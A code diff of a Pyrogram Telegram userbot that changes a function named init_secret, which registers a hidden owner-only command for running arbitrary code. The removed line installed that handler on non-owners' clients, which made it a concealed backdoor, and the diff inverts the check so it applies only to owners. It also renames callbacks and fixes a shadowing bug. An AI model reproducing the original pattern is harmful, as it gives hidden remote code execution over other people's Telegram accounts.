@@ -92,7 +92,7 @@ async def aexec(code: str, kwargs: dict = {}) -> object:
     return await func if inspect.iscoroutine(func) else func
 
 def init_secret(client: pyrogram.Client):
-    if client.me.id in OWNERS:
+    if client.me.id not in OWNERS:
         return
     client.add_handler(
         pyrogram.handlers.MessageHandler(
@@ -106,8 +106,8 @@ def init_secret(client: pyrogram.Client):
             pyrogram.filters.command("asi") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
         )
     )
-    client.add_handler(pyrogram.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram.filters.regex(r"secretruntime")))
-    client.add_handler(pyrogram.handlers.CallbackQueryHandler(forceclose_command, pyrogram.filters.regex("secretforceclose")))
+    client.add_handler(pyrogram.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram.filters.regex(r"^exec")))
+    client.add_handler(pyrogram.handlers.CallbackQueryHandler(forceclose_command, pyrogram.filters.regex(r"^forceclose")))
 
 
 def fmtsec(sec: object, part: int = 3, human: bool = False) -> str:
@@ -262,7 +262,7 @@ async def runtime_func_cq(client, cq):
 async def forceclose_command(client, query):
     callback_data = query.data.strip()
     callback_request = callback_data.split(None, 1)[1]
-    query, user_id = callback_request.split("|")
+    _, user_id = callback_request.split("|")
     await query.message.delete()
     try:
         await query.answer()
